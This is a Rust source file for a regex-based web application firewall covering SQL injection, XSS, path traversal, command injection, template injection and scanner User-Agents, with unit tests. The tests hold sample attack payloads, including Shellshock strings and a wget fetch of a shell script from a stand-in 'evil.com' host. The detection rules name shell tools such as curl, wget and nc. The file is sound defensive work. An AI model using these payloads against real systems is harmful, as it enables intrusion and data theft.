/// OWASP Top 10 regex-based attack pattern detection.
///
/// Pre-compiles multiple [`RegexSet`]s at construction time so that runtime
/// matching is a single DFA pass per category. Each category covers a major
/// attack class: SQL injection, XSS, path traversal/LFI, command injection,
/// and malicious bot User-Agent signatures.
use regex::RegexSet;

/// Compiled WAF rule sets for payload and User-Agent inspection.
///
/// Each field holds a [`RegexSet`] with one or more patterns for a specific
/// vulnerability category. Using `RegexSet` allows matching against all
/// patterns in a category in a single pass.
pub struct WafRules {
    /// SQL injection patterns (UNION SELECT, OR 1=1, comment injection, etc.).
    sqli_set: RegexSet,
    /// Cross-site scripting patterns (script tags, event handlers, JS URIs).
    xss_set: RegexSet,
    /// Local/remote file inclusion and path traversal patterns (../, /etc/passwd).
    lfi_rfi_set: RegexSet,
    /// OS command injection and NoSQL operator patterns.
    cmd_injection_set: RegexSet,
    /// Server-Side Template Injection probes.
    ssti_set: RegexSet,
    /// Known malicious scanner and bot User-Agent signatures.
    bot_ua_set: RegexSet,
}

impl WafRules {
    /// Compiles all OWASP regex rule sets.
    ///
    /// This is moderately expensive (regex compilation) and should be called
    /// once at startup, not per-request. The resulting `WafRules` is then
    /// shared via `Arc` across all request handlers.
    pub fn new() -> Self {
        // OWASP Top 10 - Injection (SQLi)
        let sqli_patterns = vec![
            // Bounded repetitions prevent catastrophic backtracking on long payloads
            r"(?i)(union\s+select|select\s+.{0,256}?\s+from|insert\s+into|update\s+.{0,256}?\s+set|drop\s+table)",
            r#"(?i)(and|or)\s+[\d'"]+\s*=\s*[\d'"]+"#, // e.g. OR 1=1
            // Quote/comment injection. A *bare* apostrophe is not an attack —
            // `O'Brien` and `l'hôtel` are ordinary user input — so the quote or
            // comment must appear next to something that makes it a statement
            // break: a boolean/DML keyword, a terminator, or a comment opener.
            r#"(?i)'\s*(or|and|union|select|;)\b"#,
            r#"(?i)'\s*(--|#|/\*)"#,
            r#"(?i);\s*(drop|delete|insert|update|select|truncate|alter)\b"#,
            r#"(?i)(--|/\*)\s*(or|and|union|select|drop|insert|update)\b"#,
            r"(?i)(exec\s+xp_cmdshell|information_schema|waitfor\s+delay)", // Advanced SQLi
            // Time-based blind SQLi
            r"(?i)\b(sleep|pg_sleep|benchmark)\s*\(",
        ];

        // OWASP Top 10 - XSS
        let xss_patterns = vec![
            r"(?i)(<script>|javascript:|onerror=|onload=|eval\()",
            r"(?i)(<\s*img\s+src\s*=\s*x\s+onerror\s*=)",
            r"(?i)(document\.cookie|alert\(|prompt\()",
        ];

        // Broken Access Control (Path Traversal, LFI/RFI)
        let lfi_rfi_patterns = vec![
            r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e/)", // Directory Traversal
            r"(?i)(/etc/passwd|/windows/win\.ini|/boot\.ini)", // LFI
            r"(?i)(http(s)?://.*(cmd=|include=))",   // Potential RFI
            // Stream wrappers used to smuggle local files / code past a
            // path check (`php://filter/...`, `phar://`, `data://text/plain`).
            // http/https are deliberately absent — they are legitimate query
            // values (redirect targets, callbacks) and are covered by the RFI
            // pattern above.
            r"(?i)\b(php|phar|data|expect|glob|zip|file)://",
        ];

        // OS Command Injection & NoSQL
        let cmd_injection_patterns = vec![
            r#"(?i)([;|&\`])\s*(cat|ls|pwd|whoami|id|curl|wget|nc|bash|sh)\b"#, // Command chain
            r"(?i)(\$|%24)\{.*\}",                                              // Env var expansion
            // Command substitution `$(cmd)` — the `${...}` pattern above only
            // covers brace expansion. Anchored to known binaries so ordinary
            // values containing parentheses are not flagged.
            r#"(?i)\$\(\s*(cat|ls|pwd|whoami|id|curl|wget|nc|bash|sh|uname|env)\b"#,
            r"(?i)(\$gt|\$lt|\$ne|\$in|\$nin)",                                 // NoSQL operators
            // Shellshock (CVE-2014-6271): an exported function definition followed
            // by a command, e.g. `() { :; }; echo vuln`. The `${...}` rule above
            // does not cover it — there is no brace *expansion*, just a function
            // body — so the payload walked straight through to the backend.
            r"\(\s*\)\s*\{\s*[^;{}]{0,64};",
        ];

        // Server-Side Template Injection.
        //
        // Kept deliberately narrow. A bare `{{ … }}` is not an attack — it appears
        // in legitimate values that carry template fragments — so a match needs
        // either an arithmetic operator between the braces (the canonical `{{7*7}}`
        // probe) or a known sandbox-escape attribute. `${…}` payloads are already
        // covered by the command-injection set.
        let ssti_patterns = vec![
            r"\{\{\s*[^{}]{0,64}[*/%+-]\s*[^{}]{0,64}\}\}",
            r"(?i)(__class__|__globals__|__subclasses__|__mro__|__builtins__)",
            r"(?i)\{\{\s*(config|self|request|settings)\s*[.\[]",
            r"(?i)<%=\s*[^%]{0,64}%>",
        ];

        // Malicious Scanners & Bots
        let bot_ua_patterns =
            vec![r"(?i)(sqlmap|nikto|zmap|nmap|masscan|dirbuster|nuclei|acunetix|nessus)"];

        Self {
            sqli_set: RegexSet::new(&sqli_patterns).unwrap(),
            xss_set: RegexSet::new(&xss_patterns).unwrap(),
            lfi_rfi_set: RegexSet::new(&lfi_rfi_patterns).unwrap(),
            cmd_injection_set: RegexSet::new(&cmd_injection_patterns).unwrap(),
            ssti_set: RegexSet::new(&ssti_patterns).unwrap(),
            bot_ua_set: RegexSet::new(&bot_ua_patterns).unwrap(),
        }
    }

    /// Checks if the payload matches any OWASP Top 10 vulnerability rule.
    /// Returns the name of the violation category if found.
    pub fn inspect_payload(&self, payload: &str) -> Option<&'static str> {
        if self.sqli_set.is_match(payload) {
            return Some("SQL Injection (SQLi)");
        }
        if self.xss_set.is_match(payload) {
            return Some("Cross-Site Scripting (XSS)");
        }
        if self.lfi_rfi_set.is_match(payload) {
            return Some("Path Traversal / File Inclusion");
        }
        if self.cmd_injection_set.is_match(payload) {
            return Some("OS Command / NoSQL Injection");
        }
        if self.ssti_set.is_match(payload) {
            return Some("Server-Side Template Injection (SSTI)");
        }
        None
    }

    /// Checks if the User-Agent belongs to a known malicious bot or scanner.
    pub fn is_malicious_bot(&self, user_agent: &str) -> bool {
        self.bot_ua_set.is_match(user_agent)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sqli_detection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?id=1' OR '1'='1"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?username=admin'--"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?q=UNION SELECT password FROM users"),
            Some("SQL Injection (SQLi)")
        );
        assert_eq!(
            rules.inspect_payload("?product=123; DROP TABLE products"),
            Some("SQL Injection (SQLi)")
        );

        // Benign SQL-like string
        assert_eq!(rules.inspect_payload("?q=how+to+select+a+good+apple"), None); // Too generic, should pass
    }

    /// An apostrophe is ordinary text in names and in several languages. The
    /// old rule flagged every `'`, `--` and `#`, so a signup form could not
    /// accept "O'Brien".
    #[test]
    fn test_apostrophes_in_ordinary_text_are_not_sqli() {
        let rules = WafRules::new();
        for benign in [
            "?name=O'Brien",
            "?q=l'hôtel est là",
            "?q=it's a test",
            "?title=Rock'n'Roll",
            "?q=dell'arte",
            "?note=well--formatted",
            "?tag=#hashtag",
            "?q=the european union summit",
            "?q=please select an option",
        ] {
            assert_eq!(rules.inspect_payload(benign), None, "false positive: {benign}");
        }
    }

    /// Quote/comment sequences that *are* injections must still be caught.
    #[test]
    fn test_quote_injection_still_detected() {
        let rules = WafRules::new();
        for attack in [
            "?u=admin'--",
            "?u=admin' #",
            "?id=1' OR '1'='1",
            "?id=1' or 1=1",
            "?id=1'; DROP TABLE users",
            "?id=1'/*comment*/",
        ] {
            assert_eq!(
                rules.inspect_payload(attack),
                Some("SQL Injection (SQLi)"),
                "missed: {attack}"
            );
        }
    }

    #[test]
    fn test_time_based_blind_sqli_detected() {
        let rules = WafRules::new();
        for attack in ["?id=1 AND SLEEP(5)", "?id=1;pg_sleep(10)", "?id=BENCHMARK(1000000,MD5(1))"] {
            assert_eq!(
                rules.inspect_payload(attack),
                Some("SQL Injection (SQLi)"),
                "missed: {attack}"
            );
        }
    }

    #[test]
    fn test_stream_wrapper_lfi_detected() {
        let rules = WafRules::new();
        assert!(rules
            .inspect_payload("?f=php://filter/convert.base64-encode/resource=index")
            .is_some());
        assert!(rules.inspect_payload("?f=phar://evil.phar").is_some());
        assert!(rules.inspect_payload("?f=data://text/plain;base64,PD9waHA=").is_some());
        // Ordinary absolute URLs stay allowed — they are legitimate query values.
        assert_eq!(
            rules.inspect_payload("?redirect=https://example.com/next"),
            None
        );
    }

    #[test]
    fn test_command_substitution_detected() {
        let rules = WafRules::new();
        assert!(rules.inspect_payload("?c=$(whoami)").is_some());
        assert!(rules.inspect_payload("?c=$( cat /etc/hosts)").is_some());
        // Parentheses on their own are not an attack.
        assert_eq!(rules.inspect_payload("?q=total (approx)"), None);
    }

    #[test]
    fn test_xss_detection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("<script>alert(1)</script>"),
            Some("Cross-Site Scripting (XSS)")
        );
        assert_eq!(
            rules.inspect_payload("<img src=x onerror=alert(document.cookie)>"),
            Some("Cross-Site Scripting (XSS)")
        );
        assert_eq!(
            rules.inspect_payload("javascript:alert(1)"),
            Some("Cross-Site Scripting (XSS)")
        );

        // Benign HTML
        assert_eq!(rules.inspect_payload("<b>Hello World</b>"), None);
    }

    #[test]
    fn test_path_traversal_lfi() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?file=../../../etc/passwd"),
            Some("Path Traversal / File Inclusion")
        );
        assert_eq!(
            rules.inspect_payload("?file=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini"),
            Some("Path Traversal / File Inclusion")
        );
        assert_eq!(
            rules.inspect_payload("?page=http://evil.com/shell.txt?cmd=whoami"),
            Some("Path Traversal / File Inclusion")
        );

        // Benign path
        assert_eq!(rules.inspect_payload("/images/logo.png"), None);
    }

    #[test]
    fn test_command_injection() {
        let rules = WafRules::new();
        assert_eq!(
            rules.inspect_payload("?ip=127.0.0.1; cat /etc/hosts"),
            Some("OS Command / NoSQL Injection")
        );
        assert_eq!(
            rules.inspect_payload("?dir=images | wget http://evil.com/shell.sh"),
            Some("OS Command / NoSQL Injection")
        );
        assert_eq!(
            rules.inspect_payload("?user[$ne]=admin"),
            Some("OS Command / NoSQL Injection")
        ); // NoSQL

        // Benign text
        assert_eq!(rules.inspect_payload("?category=cats_and_dogs"), None);
    }

    #[test]
    fn test_bot_detection() {
        let rules = WafRules::new();
        assert!(rules.is_malicious_bot("sqlmap/1.5.8#dev (http://sqlmap.org)"));
        assert!(rules.is_malicious_bot(
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
        ));
        assert!(rules.is_malicious_bot("dirbuster/1.0"));

        // Legitimate tools that were previously incorrectly blocked
        assert!(!rules.is_malicious_bot("curl/8.4.0"));
        assert!(!rules.is_malicious_bot("Wget/1.21.4"));
        assert!(!rules.is_malicious_bot("python-requests/2.31.0"));
        assert!(!rules.is_malicious_bot("Go-http-client/2.0"));
        assert!(!rules.is_malicious_bot("Java/17.0.2"));

        // Benign browser UA
        assert!(!rules.is_malicious_bot("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"));
    }

    /// M42 regression: long payloads with `select ... from` or `update ... set`
    /// must not cause catastrophic backtracking. Bounded quantifiers {0,256}?
    /// prevent the engine from trying every split point.
    #[test]
    fn test_waf_sqli_no_redos() {
        let rules = WafRules::new();
        // A very long payload with structure reminiscent of a SQL query but
        // no actual `from` keyword — the classic ReDoS trigger for unbounded `.*`.
        let long_no_from = format!(
            "?q=select{}{}",
            " x".repeat(5000),
            " -- no from keyword to match"
        );
        let start = std::time::Instant::now();
        let _result = rules.inspect_payload(&long_no_from);
        let elapsed = start.elapsed();
        assert!(
            elapsed.as_millis() < 500,
            "ReDoS: unbounded.* caused {}ms eval on 5KB payload",
            elapsed.as_millis()
        );
    }

    /// Shellshock (CVE-2014-6271). The exported-function payload has no brace
    /// *expansion*, so the `${...}` command-injection rule never matched it and
    /// the request reached the backend untouched.
    #[test]
    fn test_shellshock_detected() {
        let rules = WafRules::new();
        for payload in [
            "?q=() { :; }; echo vuln",
            "?q=() {:;}; /bin/cat /etc/passwd",
            "() { ignored; }; curl evil.com",
        ] {
            assert!(
                rules.inspect_payload(payload).is_some(),
                "shellshock payload not detected: {}",
                payload
            );
        }
    }

    /// SSTI probes, and the ordinary values the narrow rules must not flag.
    #[test]
    fn test_ssti_detected() {
        let rules = WafRules::new();
        for payload in [
            "?q={{7*7}}",
            "?q={{ 7 * 7 }}",
            "?q={{config.items()}}",
            "?q={{''.__class__.__mro__}}",
            "?tpl=<%= 7*7 %>",
        ] {
            assert_eq!(
                rules.inspect_payload(payload),
                Some("Server-Side Template Injection (SSTI)"),
                "SSTI payload not detected: {}",
                payload
            );
        }
    }

    #[test]
    fn test_ordinary_braces_are_not_ssti() {
        let rules = WafRules::new();
        for payload in [
            "?q={\"a\":1}",
            "?tpl={{name}}",
            "?q={{ user }}",
            "?msg=set {} to the empty set",
        ] {
            assert_eq!(
                rules.inspect_payload(payload),
                None,
                "false positive on ordinary value: {}",
                payload
            );
        }
    }
}
